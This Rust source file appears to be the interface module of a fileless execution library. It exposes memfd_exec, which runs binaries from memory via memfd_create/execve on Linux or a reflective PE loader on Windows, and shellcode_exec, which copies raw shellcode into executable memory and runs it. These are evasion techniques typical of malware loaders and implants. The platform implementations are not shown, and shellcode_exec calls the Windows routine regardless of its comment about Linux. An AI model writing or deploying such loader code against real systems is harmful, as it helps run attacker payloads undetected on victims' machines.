#[cfg(target_os = "linux")]
mod linux;

mod windows;

use thiserror::Error;

#[derive(Error, Debug)]
pub enum ExecError {
    #[error("memfd_create failed: {0}")]
    MemfdCreate(std::io::Error),
    #[error("memfd write failed: {0}")]
    MemfdWrite(std::io::Error),
    #[error("execve failed: {0}")]
    Execve(std::io::Error),
    #[error("binary too small ({0} bytes)")]
    InvalidBinary(usize),
    #[error("unsupported platform")]
    UnsupportedPlatform,
}

/// Execute a binary from memory without writing to disk.
///
/// - **Linux**: memfd_create(2) + execve(2) — replaces current process
/// - **Windows**: Reflective PE loader — executes in-process
pub fn memfd_exec(binary: Vec<u8>, args: Vec<String>) -> Result<(), ExecError> {
    if binary.len() < 64 {
        return Err(ExecError::InvalidBinary(binary.len()));
    }
    #[cfg(target_os = "linux")]
    { linux::memfd_exec_impl(binary, args) }
    #[cfg(target_os = "windows")]
    { windows::exec_in_memory(binary, args) }
    #[cfg(not(any(target_os = "linux", target_os = "windows")))]
    { let _ = (binary, args); Err(ExecError::UnsupportedPlatform) }
}

/// Execute raw shellcode in-memory.
///
/// Allocates executable memory, copies shellcode, and transfers execution.
/// - **Linux**: mmap with PROT_EXEC
/// - **Windows**: VirtualAlloc with PAGE_EXECUTE_READWRITE
pub fn shellcode_exec(shellcode: &[u8]) -> Result<(), ExecError> {
    windows::shellcode_exec(shellcode)
}
